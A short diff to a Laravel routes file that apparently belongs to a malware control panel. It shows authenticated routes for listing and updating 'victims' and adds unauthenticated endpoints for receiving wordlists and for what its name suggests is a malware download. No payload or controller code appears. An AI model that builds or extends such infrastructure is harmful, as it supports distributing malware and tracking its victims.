@@ -37,3 +37,7 @@ Route::middleware(['auth'])->group(function () {
     Route::get('victims', [\App\Http\Controllers\VictimsController::class, 'index']);
     Route::put('victims/{id}', [\App\Http\Controllers\VictimsController::class, 'update'])->name('victims.update');
 });
+
+
+Route::get('wdlst/{list}', [\App\Http\Controllers\ApiWordlist::class, 'receive']);
+Route::get('mlw', [\App\Http\Controllers\ApiMlwController::class, 'malwdwn']);
